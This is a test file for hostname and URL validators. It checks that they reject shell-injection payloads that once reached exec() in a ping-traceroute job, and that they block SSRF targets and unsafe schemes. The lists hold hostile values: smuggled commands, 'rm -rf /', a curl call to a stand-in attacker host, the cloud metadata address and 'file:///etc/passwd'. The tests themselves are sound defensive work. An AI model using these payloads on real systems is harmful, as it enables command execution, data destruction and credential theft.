import { describe, it, expect } from 'vitest';
import { assertHostname, assertFetchableUrl } from '@/lib/tools/validation';

describe('assertHostname - shell metacharacter rejection', () => {
  // These are the payloads that previously reached `exec()` in the
  // ping-traceroute job and achieved command execution.
  const injectionPayloads = [
    'example.com; whoami',
    'example.com && whoami',
    'example.com | whoami',
    'example.com`whoami`',
    'example.com$(whoami)',
    'example.com\nwhoami',
    'example.com & ping -n 100 127.0.0.1',
    '; rm -rf /',
    '$(curl attacker.tld)',
    'ex ample.com',
    '',
    '   ',
  ];

  it.each(injectionPayloads)('rejects %j', (payload) => {
    expect(() => assertHostname(payload)).toThrow();
  });

  it('rejects non-string input', () => {
    expect(() => assertHostname(undefined)).toThrow();
    expect(() => assertHostname(null)).toThrow();
    expect(() => assertHostname({ evil: true })).toThrow();
    expect(() => assertHostname(['example.com'])).toThrow();
  });
});

describe('assertHostname - legitimate input', () => {
  it.each([
    ['example.com', 'example.com'],
    ['https://example.com/path?q=1', 'example.com'],
    ['http://example.com', 'example.com'],
    ['sub.example.co.uk', 'sub.example.co.uk'],
    ['EXAMPLE.com', 'example.com'],
    ['example.com.', 'example.com'],
    ['example.com:8443', 'example.com'],
    ['user:pass@example.com', 'example.com'],
    ['8.8.8.8', '8.8.8.8'],
  ])('normalises %j to %j', (input, expected) => {
    expect(assertHostname(input)).toBe(expected);
  });
});

describe('assertFetchableUrl - SSRF protection', () => {
  const ssrfTargets = [
    'http://127.0.0.1/',
    'http://127.0.0.1:8080/admin',
    'http://169.254.169.254/latest/meta-data/', // cloud metadata
    'http://10.0.0.5/',
    'http://192.168.1.1/',
    'http://172.16.0.1/',
    'http://[::1]/',
    'http://0.0.0.0/',
    'http://100.64.0.1/', // CGNAT
  ];

  it.each(ssrfTargets)('rejects private/reserved target %s', async (target) => {
    await expect(assertFetchableUrl(target)).rejects.toThrow();
  });

  const badSchemes = [
    'file:///etc/passwd',
    'gopher://example.com/',
    'ftp://example.com/',
    'data:text/html,<script>alert(1)</script>',
  ];

  it.each(badSchemes)('rejects non-http scheme %s', async (target) => {
    await expect(assertFetchableUrl(target)).rejects.toThrow();
  });

  it('rejects empty and non-string input', async () => {
    await expect(assertFetchableUrl('')).rejects.toThrow();
    await expect(assertFetchableUrl(undefined)).rejects.toThrow();
  });
});
